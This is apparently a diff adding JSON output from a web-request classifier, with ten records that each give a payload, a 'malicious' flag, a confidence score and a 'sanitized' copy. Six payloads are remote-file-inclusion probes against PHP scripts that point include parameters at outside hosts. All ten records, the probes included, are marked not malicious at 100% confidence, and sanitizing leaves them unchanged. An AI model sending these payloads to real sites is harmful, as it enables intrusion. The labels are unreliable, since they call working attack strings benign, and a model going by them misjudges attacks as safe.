@@ -1,0 +1,60 @@
+{"message": "OK", 
+	"payload": "/includes/functions_kb.php?phpbb_root_path=http://cirt.net/rfiinc.txt?", 
+	"malicious": "False", 
+	"confidence": 100.0, 
+	"sanitized": "/includes/functions_kb.php?phpbb_root_path=http://cirt.net/rfiinc.txt?"
+	}
+{"message": "OK", 
+	"payload": "/setup/upgrader.php?rootdirectory=http://cirt.net/rfiinc.txt?", 
+	"malicious": "False", 
+	"confidence": 100.0, 
+	"sanitized": "/setup/upgrader.php?rootdirectory=http://cirt.net/rfiinc.txt?"
+	}
+{"message": "OK", 
+	"payload": "http://kmddmmalgxyarsoccwgiqtkfrvwuxqld.com", 
+	"malicious": "False", 
+	"confidence": 100.0, 
+	"sanitized": "http://kmddmmalgxyarsoccwgiqtkfrvwuxqld.com"
+	}
+{"message": "OK", 
+	"payload": "/games.php?scoreid=http://192.168.202.118:8080/tzhfyzkbomspvm?", 
+	"malicious": "False", 
+	"confidence": 100.0, 
+	"sanitized": "/games.php?scoreid=http://192.168.202.118:8080/tzhfyzkbomspvm?"
+	}
+{"message": "OK", 
+	"payload": "/modules/search/search.php?language_home=&rootdp=zzz&gslanguage=http://192.168.202.118:8080/ghl9il??", 
+	"malicious": "False", 
+	"confidence": 100.0, 
+	"sanitized": "/modules/search/search.php?language_home=&amp;rootdp=zzz&amp;gslanguage=http://192.168.202.118:8080/ghl9il??"
+	}
+{"message": "OK", 
+	"payload": "/afb-3-beta-2007-08-28/_includes/settings.inc.php?approot=http://cirt.net/rfiinc.txt??", 
+	"malicious": "False", 
+	"confidence": 100.0, 
+	"sanitized": "/afb-3-beta-2007-08-28/_includes/settings.inc.php?approot=http://cirt.net/rfiinc.txt??"
+	}
+{"message": "OK", 
+	"payload": "usernum=1934660440&amp;action=list&amp;siteid=\n", 
+	"malicious": "False", 
+	"confidence": 100.0, 
+	"sanitized": "usernum=1934660440&amp;action=list&amp;siteid=\n"
+	}
+{"message": "OK", 
+	"payload": "doc=perseus%3aabo%3aphi%2c0474%2c025&amp;query=init.\n\n", 
+	"malicious": "False", 
+	"confidence": 100.0, 
+	"sanitized": "doc=perseus%3aabo%3aphi%2c0474%2c025&amp;query=init.\n\n"
+	}
+{"message": "OK", 
+	"payload": "action=howto&amp;p=homedecor/refnwdfurn&amp;topic=howtolibrary\n\n\n", 
+	"malicious": "False", 
+	"confidence": 100.0, 
+	"sanitized": "action=howto&amp;p=homedecor/refnwdfurn&amp;topic=howtolibrary\n\n\n"
+	}
+{"message": "OK", 
+	"payload": "cfid=2469998&amp;cftoken=46239211&amp;cfid=2469998&amp;cftoken=46239211\n\n\n\n", 
+	"malicious": "False", 
+	"confidence": 100.0, 
+	"sanitized": "cfid=2469998&amp;cftoken=46239211&amp;cfid=2469998&amp;cftoken=46239211\n\n\n\n"
+	}
